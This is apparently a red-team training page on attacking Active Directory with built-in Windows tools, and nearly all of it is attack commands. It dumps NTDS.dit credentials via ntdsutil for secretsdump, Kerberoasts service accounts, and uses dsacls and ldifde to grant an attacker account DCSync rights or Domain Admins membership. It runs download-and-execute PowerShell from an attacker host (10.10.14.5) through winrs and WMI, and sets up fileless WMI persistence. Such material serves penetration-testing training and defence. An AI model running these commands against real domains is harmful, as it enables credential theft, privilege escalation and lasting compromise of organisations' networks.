---
layout: training-page
title: "AD Living Off the Land — Red Team Academy"
module: "Active Directory"
tags:
  - lotl
  - active-directory
  - native-tools
  - ntdsutil
  - ldifde
  - repadmin
  - setspn
page_key: "ad-lotl"
render_with_liquid: false
---

# Active Directory Living Off the Land

## Overview

Full Active Directory compromise is achievable using only tools signed by Microsoft and built into Windows — no Mimikatz, no BloodHound, no Impacket required. This module covers the native Windows binaries and PowerShell cmdlets that replicate the capabilities of common offensive AD tools. The goal is maximum capability with minimum tooling: every command here runs on a domain-joined Windows host with standard user or admin credentials.

Key tools covered: **ntdsutil**, **repadmin**, **ldifde / csvde**, **dsacls**, **setspn**, **netdom**, **nltest**, **winrs**, **ADSI queries**, and the **ActiveDirectory PowerShell module**.

## PowerShell ActiveDirectory Module — No BloodHound Required

The RSAT ActiveDirectory module (`Microsoft.ActiveDirectory.Management.dll`) is installed on any host with RSAT or on Domain Controllers. It is Microsoft-signed and produces no offensive tool signatures. Combined with `Get-ADObject` and raw LDAP filters, it replicates most BloodHound collection without executing a single offensive binary.

```
# ── Load the AD module (auto-loads if RSAT is installed) ──
Import-Module ActiveDirectory

# ── Domain and forest reconnaissance ──
Get-ADDomain                                         # domain name, SID, FSMO roles
Get-ADForest                                         # forest root, global catalogs, trusts
(Get-ADDomain).DomainControllers                     # list all DCs
(Get-ADForest).Domains                               # all domains in the forest
(Get-ADForest).GlobalCatalogs                        # GC servers
(Get-ADDomain).ChildDomains                          # child domains

# ── User enumeration ──
Get-ADUser -Filter * -Properties *                   # all users + all attributes
Get-ADUser -Filter {adminCount -eq 1} -Properties adminCount,memberOf  # admin-tier accounts
Get-ADUser -Filter {PasswordNeverExpires -eq $true} -Properties PasswordNeverExpires
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName  # Kerberoastable

# ── Group and membership enumeration ──
Get-ADGroup -Filter {adminCount -eq 1}               # privileged groups
Get-ADGroupMember "Domain Admins" -Recursive         # all members, including nested
Get-ADGroupMember "Enterprise Admins" -Recursive
Get-ADPrincipalGroupMembership (Get-ADUser jsmith)  # groups a user belongs to

# ── Computer enumeration ──
Get-ADComputer -Filter * -Properties OperatingSystem,LastLogonDate,DNSHostName |
  Select-Object Name,OperatingSystem,LastLogonDate |
  Where-Object LastLogonDate -gt (Get-Date).AddDays(-30)  # recently active

# ── ACL inspection — find writable objects (replaces BloodHound ACL edges) ──
# Get the ACL for a specific AD object:
(Get-Acl "AD:\CN=krbtgt,CN=Users,DC=corp,DC=local").Access |
  Where-Object { $_.IdentityReference -notlike "*BUILTIN*" -and $_.IdentityReference -notlike "*NT AUTHORITY*" }

# Enumerate WriteDACL rights on the domain object (privilege escalation path):
(Get-Acl "AD:\DC=corp,DC=local").Access |
  Where-Object ActiveDirectoryRights -match "WriteDacl|GenericAll|GenericWrite"

# ── Fine-grained password policies (PSO) ──
Get-ADFineGrainedPasswordPolicy -Filter *
Get-ADUserResultantPasswordPolicy (Get-ADUser jsmith)

# ── Find AS-REP-roastable accounts (no pre-auth required) ──
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# ── Enumerate LAPS (check which computers have local admin password stored) ──
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime |
  Where-Object ms-Mcs-AdmPwd -ne $null |
  Select-Object Name,'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime'
```

## ADSI Queries — No Module Required

ADSI (Active Directory Service Interfaces) is built into every Windows system since Windows 2000. It requires no extra modules and executes LDAP queries directly from PowerShell or VBScript. Particularly useful on restricted hosts where `Import-Module ActiveDirectory` is blocked.

```
# ── Create an ADSI searcher targeting the current domain ──
$dom  = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$ldap = "LDAP://$($dom.Name)"
$root = [ADSI]$ldap

# ── Build a DirectorySearcher object ──
$searcher = New-Object DirectoryServices.DirectorySearcher($root)

# ── Find all domain admins (LDAP filter for the Domain Admins group) ──
$searcher.Filter = "(&(objectCategory=group)(cn=Domain Admins))"
$da = $searcher.FindOne()
$da.Properties.member                            # list of member DNs

# ── Find all users with an SPN set (Kerberoastable accounts) ──
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname; $_.Properties.serviceprincipalname }

# ── Find computers with unconstrained delegation ──
$searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
$searcher.FindAll() | ForEach-Object { $_.Properties.dnshostname }

# ── Find accounts with constrained delegation (msDS-AllowedToDelegateTo) ──
$searcher.Filter = "(msDS-AllowedToDelegateTo=*)"
$searcher.PropertiesToLoad.AddRange(@("samAccountName","msDS-AllowedToDelegateTo"))
$searcher.FindAll() | ForEach-Object {
  "User: " + $_.Properties.samaccountname
  "Delegate to: " + $_.Properties.'msds-allowedtodelegateto'
}

# ── Query from a different domain or DC directly ──
$searcher2 = New-Object DirectoryServices.DirectorySearcher
$searcher2.SearchRoot = [ADSI]"LDAP://DC=child,DC=corp,DC=local"
$searcher2.Filter = "(objectClass=user)"
$searcher2.FindAll() | ForEach-Object { $_.Properties.samaccountname }
```

## setspn.exe — SPN Enumeration & Kerberoasting Setup

`setspn.exe` is the native Microsoft tool for managing Service Principal Names. It reads SPNs directly from AD without any authentication beyond a domain user account. It is also the legitimate tool for adding SPNs — which attackers can abuse to set up Kerberoasting targets on user accounts they control.

```
# ── Enumerate all SPNs in the domain (no elevated rights needed) ──
setspn.exe -T corp.local -Q */*

# ── Find SPNs for a specific service type ──
setspn.exe -T corp.local -Q MSSQLSvc/*          # SQL Server service accounts
setspn.exe -T corp.local -Q HTTP/*              # IIS/web service accounts
setspn.exe -T corp.local -Q cifs/*              # File share service accounts

# ── Show SPNs registered on a specific account ──
setspn.exe -L svc_sql                           # SPNs on svc_sql user
setspn.exe -L CORP\svc_http

# ── Add an SPN to a user account you control (set up a Kerberoastable target) ──
# Requires write access to the account or DA rights:
setspn.exe -A MSSQLSvc/fake-host.corp.local:1433 svc_controlled

# ── Delete an SPN (cleanup) ──
setspn.exe -D MSSQLSvc/fake-host.corp.local:1433 svc_controlled

# ── Kerberoast with PowerShell after finding SPNs via setspn ──
# Request a TGS for the SPN (triggers ticket issuance, which can be cracked offline):
Add-Type -AssemblyName System.IdentityModel
$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.corp.local:1433"
# Extract the ticket for offline cracking:
[Convert]::ToBase64String($ticket.GetRequest())
```

## ldifde.exe & csvde.exe — Bulk AD Export

`ldifde` and `csvde` are Microsoft-signed utilities for importing and exporting AD data in LDIF and CSV formats respectively. Both tools perform a full authenticated LDAP bind and dump every object the account can read — giving an attacker a complete offline snapshot of the domain without running any offensive tooling.

```
# ── Export all objects to LDIF (includes all attributes) ──
ldifde.exe -f C:\Windows\Temp\domain_dump.ldf -s corp.local

# ── Export only user objects with specific attributes ──
ldifde.exe -f C:\Windows\Temp\users.ldf -s corp.local -r "(objectClass=user)" -l "samAccountName,mail,memberOf,userAccountControl,pwdLastSet"

# ── Export computer objects ──
ldifde.exe -f C:\Windows\Temp\computers.ldf -s corp.local -r "(objectClass=computer)" -l "dnshostname,operatingSystem,lastLogonTimestamp"

# ── Export only group memberships ──
ldifde.exe -f C:\Windows\Temp\groups.ldf -s corp.local -r "(objectClass=group)" -l "cn,member,adminCount"

# ── csvde — same export but in CSV format (easier to grep / parse) ──
csvde.exe -f C:\Windows\Temp\domain_dump.csv -s corp.local
csvde.exe -f C:\Windows\Temp\users.csv -s corp.local -r "(objectClass=user)"

# ── Parse the CSV with PowerShell to find privileged accounts ──
Import-Csv C:\Windows\Temp\users.csv | Where-Object admincount -eq "1" | Select-Object samaccountname,distinguishedName

# ── Use ldifde to import a modified object (e.g., add a user to a group) ──
# Create add_member.ldf:
# dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
# changetype: modify
# add: member
# member: CN=Attacker,CN=Users,DC=corp,DC=local
# -
ldifde.exe -i -f add_member.ldf                 # -i = import mode
```

## ntdsutil.exe — Offline NTDS Extraction (IFM)

`ntdsutil.exe` is the authoritative Microsoft tool for AD database management. Its `install from media (IFM)` feature creates a complete snapshot of `NTDS.dit` and the SYSTEM hive in a staging directory — intended for promoting new DCs without replication. Attackers with Domain Admin (or Backup Operator) rights can run this on any DC to extract the full credential database without touching VSS directly.

```
# ── Create an IFM snapshot (requires DA or Backup Operator rights on a DC) ──
# All commands are entered interactively OR via the pipe chain below:
ntdsutil.exe "ac i ntds" "ifm" "create full C:\Windows\Temp\IFM" q q

# Breakdown of the command pipe:
#   "ac i ntds"                  — activate instance: NTDS (select the NTDS service)
#   "ifm"                        — enter Install From Media menu
#   "create full C:\...\IFM"     — create a full (NTDS + SYSVOL) snapshot at path
#   q q                          — quit IFM menu, then quit ntdsutil

# ── Output contains ──
# C:\Windows\Temp\IFM\Active Directory\ntds.dit    ← credential database
# C:\Windows\Temp\IFM\registry\SYSTEM              ← SYSTEM hive (contains BOOTKEY)
# C:\Windows\Temp\IFM\registry\SECURITY            ← SECURITY hive

# ── Extract NTLM hashes offline (from attacker's Linux box) ──
# Use secretsdump.py (Impacket) pointing at the extracted files:
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# ── Alternative: use VSS directly via ntdsutil snapshot ──
ntdsutil.exe snapshot "activate instance ntds" create quit quit
# List snapshots:
ntdsutil.exe snapshot "list all" quit quit
# Mount a snapshot to a drive letter:
ntdsutil.exe snapshot "mount {GUID-from-list}" quit quit
# Copy the mounted NTDS.dit:
copy \\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\
```

## repadmin.exe — Replication Reconnaissance & DCSync Validation

`repadmin.exe` is the native replication diagnostic tool for AD. It communicates directly via the MS-DRSR (Directory Replication Service Remote Protocol) — the same protocol that DCSync exploits. Operators can use `repadmin` to confirm DCSync rights before running Mimikatz, enumerate replication partners, and verify the replication health of target DCs.

```
# ── Enumerate all DCs and their replication partners ──
repadmin.exe /showrepl                           # replication status of local DC
repadmin.exe /showrepl corp-dc01.corp.local      # replication status of specific DC

# ── List all DCs in the forest ──
repadmin.exe /viewlist *

# ── Check if the current account has DCSync rights ──
# DCSync requires: Replicating Directory Changes + Replicating Directory Changes All
# These are granted on the domain NC (naming context):
(Get-Acl "AD:\DC=corp,DC=local").Access |
  Where-Object { $_.ActiveDirectoryRights -match "ExtendedRight" -and
                 ($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or  # Repl Dir Changes
                  $_.ObjectType -eq "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2") }  # Repl Dir Changes All

# ── repadmin /syncall — force replication (can trigger event ID 4929) ──
repadmin.exe /syncall corp-dc01.corp.local /AdeP

# ── Show metadata for a specific account (last password change, USN, originating DC) ──
repadmin.exe /showobjmeta corp-dc01.corp.local "CN=krbtgt,CN=Users,DC=corp,DC=local"
repadmin.exe /showobjmeta * "CN=Administrator,CN=Users,DC=corp,DC=local"

# ── Display replication queue (pending changes) ──
repadmin.exe /queue

# ── Force a DCSync-style pull of a single account's attributes via repadmin ──
# (requires Replicating Directory Changes rights — same as Mimikatz DCSync)
repadmin.exe /showattr corp-dc01.corp.local "DC=corp,DC=local" /subtree /filter:"(sAMAccountName=krbtgt)" /attrs:unicodePwd,objectSid
```

## dsacls.exe — ACL Enumeration & Modification

`dsacls.exe` reads and modifies Access Control Lists on AD objects from the command line. It is the native equivalent of BloodHound's ACL edge detection and PowerView's `Get-DomainObjectAcl`. With the right permissions, it can grant an attacker account DCSync rights or WriteDACL over key objects — all using a Microsoft-signed binary.

```
# ── Read the ACL on the domain root object ──
dsacls.exe "DC=corp,DC=local"

# ── Read ACL on a specific user ──
dsacls.exe "CN=Administrator,CN=Users,DC=corp,DC=local"

# ── Read ACL on an OU ──
dsacls.exe "OU=Workstations,DC=corp,DC=local"

# ── Grant DCSync rights to an attacker-controlled account ──
# Requires WriteDACL or GenericAll on the domain root — typically requires DA rights:
# Grant "Replicating Directory Changes":
dsacls.exe "DC=corp,DC=local" /G "CORP\attacker:CA;Replicating Directory Changes"
# Grant "Replicating Directory Changes All":
dsacls.exe "DC=corp,DC=local" /G "CORP\attacker:CA;Replicating Directory Changes All"

# ── Grant GenericAll on a target user (full control) ──
dsacls.exe "CN=target_user,CN=Users,DC=corp,DC=local" /G "CORP\attacker:GA"

# ── Grant WriteDACL on an OU (allows further privilege escalation down the OU) ──
dsacls.exe "OU=Workstations,DC=corp,DC=local" /G "CORP\attacker:WD"

# ── Reset a user's password without knowing the current one (requires ResetPassword ACE) ──
dsacls.exe "CN=target_user,CN=Users,DC=corp,DC=local" /G "CORP\attacker:CA;Reset Password"

# ── Remove a permission (cleanup) ──
dsacls.exe "DC=corp,DC=local" /R "CORP\attacker"
```

## netdom.exe & nltest.exe — Trust Enumeration & Exploitation

`netdom` and `nltest` are native tools for domain trust management. They enumerate trust relationships, validate secure channels, and — with admin rights — can create or modify trusts. Trust paths are critical for cross-domain attacks: once compromised, a child domain can be used to attack the forest root via SID History injection or the ExtraSids PAC attribute.

```
# ── nltest — enumerate trusts ──
nltest /domain_trusts                            # all trusts visible to current DC
nltest /domain_trusts /all_trusts               # include indirect trusts
nltest /dclist:corp.local                       # list DCs in a domain
nltest /sc_query:corp.local                     # query secure channel to a domain
nltest /sc_verify:corp.local                    # verify the secure channel
nltest /sc_reset:corp.local                     # reset (useful to trigger auth)
nltest /server:10.10.10.10 /domain_trusts       # query a specific DC

# ── netdom — trust details and cross-domain operations ──
netdom query trust                               # query current domain trusts
netdom query fsmo                                # identify FSMO role holders
netdom query workstation                         # domain membership of local host
netdom query dc /domain:child.corp.local        # DCs in a child domain
netdom query pdc                                 # PDC emulator

# ── Verify a trust and retrieve trust attributes ──
netdom trust corp.local /domain:child.corp.local /verify

# ── Add a transitive trust from attacker-controlled domain ──
# (Requires domain admin rights in both domains):
netdom trust corp.local /domain:attacker.lab /add /twoway /transitive:yes

# ── Query the SID of a domain (needed for SID History attacks) ──
# Get SID of target forest root:
Get-ADDomain -Server forest-root.lab | Select-Object DomainSID

# Alternatively via nltest:
nltest /dsgetdc:forest-root.lab /force           # force DC discovery and print domain SID
```

## winrs.exe — WinRM-Based Lateral Movement

`winrs.exe` (Windows Remote Shell) is the command-line client for WinRM (Windows Remote Management). It executes commands on remote hosts over HTTP/HTTPS (port 5985/5986) using Kerberos or NTLM authentication. Like PSRemoting, it uses the `winrm` service — but unlike PsExec, it creates no service on the remote host and generates only WinRM events (not the more-monitored 7045 service creation events).

```
# ── Basic remote command execution ──
winrs.exe -r:http://10.10.10.50 -u:CORP\admin -p:Password123! "whoami /all"
winrs.exe -r:corp-workstation01.corp.local "ipconfig /all"

# ── Use Kerberos (no password required if you have a valid TGT) ──
# First get a TGT via Rubeus or Pass-the-Ticket, then:
winrs.exe -r:corp-dc01.corp.local "net group 'Domain Admins' /domain"

# ── Interactive shell via winrs ──
winrs.exe -r:10.10.10.50 -u:CORP\admin -p:Password123! cmd.exe

# ── Run PowerShell remotely via winrs (useful when PS remoting endpoint is restricted) ──
winrs.exe -r:10.10.10.50 "powershell -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')"

# ── Execute a command and redirect output to a file on the attacker ──
winrs.exe -r:10.10.10.50 "powershell -c Get-Process" > C:\loot\processes.txt

# ── Enumerate which hosts have WinRM enabled before attempting lateral movement ──
# Test-WSMan returns the WinRM config if the service is running:
Test-WSMan -ComputerName 10.10.10.50 -ErrorAction SilentlyContinue
# Or from command line:
winrs.exe -r:10.10.10.50 "hostname" 2>&1 | findstr /i "winrs\|error\|access"
```

## WMI for Remote Execution Without PsExec

Windows Management Instrumentation (WMI) is fully native and provides remote code execution without creating services or dropping files. `wmic.exe` and the PowerShell `Invoke-WmiMethod` / `Get-CimInstance` cmdlets use DCOM over port 135+dynamic for remote execution. This produces Windows event ID 4688 (process creation) on the target but avoids the very visible service-creation events (7045) generated by PsExec-style tools.

```
# ── Remote command execution via wmic ──
wmic /node:"10.10.10.50" /user:"CORP\admin" /password:"Password123!" process call create "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
# Retrieve the output (wmic doesn't return stdout directly):
type \\10.10.10.50\C$\Windows\Temp\out.txt

# ── WMI execution via PowerShell (CIM) ──
$cimOpts = New-CimSessionOption -Protocol Dcom
$session  = New-CimSession -ComputerName 10.10.10.50 -Credential (Get-Credential) -SessionOption $cimOpts
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{
  CommandLine = "powershell -nop -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')"
}
Remove-CimSession $session

# ── WMI event subscription persistence (no files dropped) ──
# ActiveScript subscription executes VBScript on a trigger event:
$FilterArgs = @{
  Name           = "WMIFilter"
  EventNameSpace = "root\cimv2"
  QueryLanguage  = "WQL"
  Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
  Name             = "WMIConsumer"
  ScriptingEngine  = "VBScript"
  ScriptText       = "Set objShell = CreateObject(""Wscript.Shell""):objShell.Run ""powershell -nop -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')"",0,False"
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs

# Bind filter to consumer:
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter; Consumer=$Consumer}

# ── WMI cleanup ──
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object Name -eq "WMIFilter" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer | Where-Object Name -eq "WMIConsumer" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
```
